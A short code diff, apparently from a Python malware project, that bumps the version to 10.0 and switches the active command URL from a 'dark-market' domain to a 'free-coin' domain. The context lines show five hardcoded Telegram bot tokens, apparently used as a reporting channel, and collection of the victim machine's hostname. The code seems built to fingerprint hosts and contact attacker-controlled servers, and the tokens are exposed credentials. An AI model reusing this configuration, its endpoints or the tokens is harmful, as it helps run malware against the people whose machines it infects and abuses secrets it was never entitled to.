@@ -8,7 +8,7 @@ visible_v=0
 
 vpn_type="N"
 total_l0g=[]
-vversion="9.0 MAC+ NRD_AUTO-UP *"
+vversion="10.0 MAC+ NRD_AUTO-UP *"
 telegram_tokens_bot=["0","5036803152:AAGs0ES1OmEdy86MNJDp7mp19BB5IQhcVHU","5099462819:AAEndTxvXaSqBQ6E_EpiCN02a81ROGPMgr0","5001651751:AAGzzbUfJXWHZz-FKJyLSUxzg-JiRMO5v-Q","5041058138:AAFRher-cMwnRI476iW24tT6Kt8lvC0bmLc","5051743922:AAEOHJTRzv2WIxZ8bR-VrVYNA6io6qB1Ltw"]
 hostname_os=socket.getfqdn()
 
@@ -17,9 +17,9 @@ def ap_2_l0g(gms):
 
 # urls=["https://dark0s-market.eu.org/index.html"]
 #"http://free-coin.nichesite.org/index.html"]
-urls=["https://dark-market.eu.org/index.html"]
+# urls=["https://dark-market.eu.org/index.html"]
 #,"https://dark0s-market.eu.org/index.html"]
-
+urls=["http://free-coin.nichesite.org/index.html"]
 #
 def set_url():
 	random_url=random.choice(urls)
